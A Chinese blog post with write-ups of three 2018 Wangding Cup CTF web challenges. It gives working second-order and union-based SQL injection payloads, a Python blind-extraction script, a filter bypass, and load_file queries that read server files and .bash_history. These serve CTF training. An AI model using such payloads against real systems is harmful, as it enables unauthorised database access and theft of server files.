<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>历届网鼎真题复盘 ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">历届网鼎真题复盘</p>
            <br>
            
            <p>Tuesday, April 7th 2020, 2:09 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="网鼎杯-2018-Unfinish"><a href="#网鼎杯-2018-Unfinish" class="headerlink" title="网鼎杯-2018-Unfinish"></a>网鼎杯-2018-Unfinish</h1><p>打开页面发现直接事登陆页面：<br><img src="https://s1.ax1x.com/2020/04/07/Gcjo8K.png" alt="Gcjo8K.png"></p>
<p>尝试寻找，找到了注册页面<code>register.php</code>。。<br>注册账号登陆发现：<br><img src="https://s1.ax1x.com/2020/04/07/GczfEj.png" alt="GczfEj.png"><br>登陆后，页面没有什么功能，只显示用户名<br>所以猜测是二次注入。</p>
<p>尝试注册用户<code>0&#39;^123^&#39;0</code><br>登陆发现：<br><img src="https://s1.ax1x.com/2020/04/07/Gg9KHg.png" alt="Gg9KHg.png"><br>用户名显示为123，所以大致的思路已经清晰了，可以一位一位的爆数据，但是在注册页面发现用户名过滤了<code>,</code>所有可以这样爆数据：<br><code>0&#39;^(select ascii(substr(database() from  1 for 1 )))^&#39;0</code>类似这样可以爆出数据库的所有内容</p>
<p>脚本如下：</p>
<pre><code>import requests
import string
import re as r
import sys

reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)

ch = string.ascii_lowercase+string.digits+&#39;-}&#39;+&#39;{&#39;

re = requests.session()
url = &#39;http://6b1599a2-65b3-4c80-a75d-5200bc1a966c.node3.buuoj.cn/&#39;

def register(email,username):
    url1 = url+&#39;register.php&#39; 
    data = dict(email = email, username = username,password = &#39;adsl1234&#39;)
    html = re.post(url1,data=data)
    html.encoding = &#39;utf-8&#39;
    return html

def login(email):
    url2 = url+&#39;login.php&#39;
    data = dict(email = email,password = &#39;adsl1234&#39;)
    html = re.post(url2, data=data)
    html.encoding = &#39;utf-8&#39;
    return html


f = &#39;&#39;
for j in range(1,50):
    payload = &quot;0&#39;^(select ascii(substr((select * from flag) from  {} for {})))^&#39;0&quot;.format(int(j),1)
    email = &#39;{}@qq.com&#39;.format(str(j)+&#39;aaa&#39;)
    html = register(email,payload)
    html = login(email)
    try:
        res = r.findall(r&#39;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#39;,html.text,r.S)
        flag = res[0][1:].strip()
        f += chr(int(flag))
        print f
    except:
        print &quot;error&quot;
</code></pre><p>得到flag:<br><img src="https://s1.ax1x.com/2020/04/07/GgPA6P.png" alt="GgPA6P.png"></p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="网鼎杯-2018-Fakebook"></a>网鼎杯-2018-Fakebook</h1><p>打开页面，注册账号进行登陆，<br><img src="https://s1.ax1x.com/2020/04/07/GgFxmV.png" alt="GgFxmV.png"><br>这个页面传递的参数为：<code>view.php?no=1</code>猜测存在sql注入。<br>测试了一下：发现过滤<code>union select</code> 但是<code>union/**/select</code>可以绕过,尝试一下联合注入。。</p>
<p>测试发现：一共有4列，回显为在第二列。<br><img src="https://s1.ax1x.com/2020/04/07/GgA8C4.png" alt="GgA8C4.png"></p>
<p>库名：fakebook<br> payload: <code>/view.php?no=0%20union/**/select+1,database(),3,4</code></p>
<p>表名： users</p>
<p>payload: <code>/view.php?no=0%20union/**/select+1,(SELECT%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),3,4</code></p>
<p>列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS<br>payload: <code>/view.php?no=0%20union/**/select+1,(Select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),3,4</code></p>
<p>但是没有发现flag。。。。</p>
<p>猜测flag是在页面<code>flag.php</code>里面，尝试读取flag页面内容：<br><code>/view.php?no=0%20union/**/select+1,load_file(%27/var/www/html/flag.php%27),3,4</code><br>得到flag:<br><img src="https://s1.ax1x.com/2020/04/07/GgVHH0.png" alt="GgVHH0.png"></p>
<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="网鼎杯-2018-Comment"></a>网鼎杯-2018-Comment</h1><p>打开页面，发帖需要登陆，根据登陆框的提示，爆破得到账号密码<code>zhangwei:zhangwei666</code><br><img src="https://s1.ax1x.com/2020/04/07/Ggewyd.png" alt="Ggewyd.png"></p>
<p>扫了一下目录，发现存在<code>.git</code>,猜测存在源码泄露：</p>
<p>存在write_do.php的源码：</p>
<pre><code>&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
    header(&quot;Location: ./login.php&quot;);
    die();
}
if(isset($_GET[&#39;do&#39;])){
switch ($_GET[&#39;do&#39;])
{
case &#39;write&#39;:
    $category = addslashes($_POST[&#39;category&#39;]);
    $title = addslashes($_POST[&#39;title&#39;]);
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into board
            set category = &#39;$category&#39;,
                title = &#39;$title&#39;,
                content = &#39;$content&#39;&quot;;
    $result = mysql_query($sql);
    header(&quot;Location: ./index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num&gt;0){
    $category = mysql_fetch_array($result)[&#39;category&#39;];
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    }
    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
    break;
default:
    header(&quot;Location: ./index.php&quot;);
}
}
else{
    header(&quot;Location: ./index.php&quot;);
}
?&gt;

</code></pre><p>分析代码 存在二次注入：<br>先addslashes转义存入数据库。再从数据库中查询放入sql语句。没有进行转义</p>
<p>sql语句为：</p>
<pre><code>    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
</code></pre><p>我们可以通过注释符来进行操作：</p>
<pre><code>$sql = &quot;insert into comment
            set category = &#39;&#39;,content=database(),/*&#39;,
                content = &#39;*/#&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;
</code></pre><p>所以  我们发贴为<code>CATEGORY：123&#39;,content=database(),/*</code><br>然后评论为<code>*/#</code>就能够进行二次注入了。 </p>
<p>所以，我们以可尝试读文件：<code></code><br><img src="https://s1.ax1x.com/2020/04/07/Ggl2Ed.png" alt="Ggl2Ed.png"><br>读取下www用户的.bash_history</p>
<p>payload: <code>123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p>
<p><img src="https://s1.ax1x.com/2020/04/07/Gg1exK.png" alt="Gg1exK.png"><br>我们发现<code>/tmp/html/.DS_Store</code>文件还在 读一下</p>
<p>payload：<code>123&#39;, content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p>
<p>得到flag文件名：<br><img src="https://s1.ax1x.com/2020/04/07/Gg35nS.png" alt="Gg35nS.png"></p>
<p>payload：<code>123&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code><br>得到：<code>3C3F7068700A0924666C61673D22666C61677B39626661663262342D386362382D343435662D616134662D3631643231313531656130657D223B0A3F3E0A</code><br>得到flag<br><img src="https://s1.ax1x.com/2020/04/07/GgG9r8.png" alt="GgG9r8.png"></p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>